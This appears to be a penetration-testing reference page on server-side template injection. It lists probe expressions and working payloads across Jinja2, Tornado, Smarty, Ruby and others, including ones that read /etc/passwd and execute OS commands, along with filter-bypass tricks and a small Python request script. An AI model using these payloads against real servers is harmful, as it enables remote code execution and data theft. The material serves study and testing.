template injection
========================================

Introduction
----------------------------------------
A template engine is used to render content using dynamic data. This contextual data is typically controlled by the user and formatted by templates to generate web pages, emails, etc. The template engine processes contextual data using code constructs such as conditionals, loops, etc., allowing the use of powerful language expressions in templates to render dynamic content. If an attacker is able to control the template being rendered, they would be able to inject expressions that could expose contextual data or even run arbitrary commands on the server.

Test method
----------------------------------------
- Determine which engine to use
- Check the engine-related documentation to determine its security mechanism and its own functions and variables
- Need to find the attack surface and try to attack

test case
----------------------------------------
- Simple mathematical expression, ``{{ 7+7 }} => 14``
- String expression ``{{ "ajin" }} => ajin``
- Ruby
    - ``<%= 7 * 7 %>``
    - ``<%= File.open('/etc/passwd').read %>``
- Java
    - ``${7*7}``
- Twig
    - ``{{7*7}}``
- Smarty
    - ``{php}echo `id`;{/php}``
- AngularJS
    - ``$eval('1+1')``
- Tornado
    - Reference module ``{% import module %}``
    - => ``{% import os %}{{ os.popen("whoami").read() }}``
- Flask/Jinja2
    - ``{{ config }}``
    - ``{{ config.items() }}``
    - ``{{get_flashed_messages.__globals__['current_app'].config}}``
    - ``{{''.__class__.__mro__[-1].__subclasses__()}}``
    - ``{{ url_for.__globals__['__builtins__'].__import__('os').system('ls') }}``
    - ``{{ request.__init__.__globals__['__builtins__'].open('/etc/passwd').read() }}``
- Django
    - ``{{ request }}``
    - ``{% debug %}``
    - ``{% load module %}``
    - ``{% include "x.html" %}``
    - ``{% extends "x.html" %}``

Target
----------------------------------------
- Create objects
- File reading and writing
- Remote file inclusion
- Information leakage
- Elevate privileges

Related properties
----------------------------------------

``__class__``
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
New-style classes in Python (that is, classes that display inherited object objects) have an attribute ``__class__``, which is used to obtain the class corresponding to the current instance. For example, ``"".__class__`` can obtain the class corresponding to the string instance.

``__mro__`` 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
The ``__mro__`` attribute of a class object in python will return a tuple object, which contains all inherited base classes of the current class object. The order of the elements in the tuple is the order searched by MRO (Method Resolution Order).

``__globals__``
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
All global variables owned by the function are saved. During utilization, you can use ``__init__`` to obtain the function of the object, and use ``__globals__`` to obtain modules such as ``file`` and ``os`` for further utilization.

``__subclasses__()``
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Python's new-style classes retain references to all its subclasses. ``__subclasses__()`` This method returns references to all surviving subclasses of the class (class object references, not instances).

Because classes in python all inherit from object, you can get the object of the desired class by calling the __subclasses__()__ method of the object class object.

Common Payload
----------------------------------------
- ``().__class__.__bases__[0].__subclasses__()[40](r'/etc/passwd').read()``
- ``().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls /").read()' )``

Bypass tricks
----------------------------------------

String concatenation
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
``request['__cl'+'ass__'].__base__.__base__.__base__['__subcla'+'sses__']()[60]``

Use parameter bypass
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::

    params = {
        'clas': '__class__',
        'mr': '__mro__',
        'subc': '__subclasses__'
    }
    data = {
        "data": "{{''[request.args.clas][request.args.mr][1][request.args.subc]()}}"
    }
    r = requests.post(url, params=params, data=data)
    print(r.text)

Reference link
----------------------------------------
- `Server-side template injection <https://zhuanlan.zhihu.com/p/28823933>`_
- `Use Python features to execute arbitrary codes in <http://blog.knownsec.com/2016/02/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates/>`_
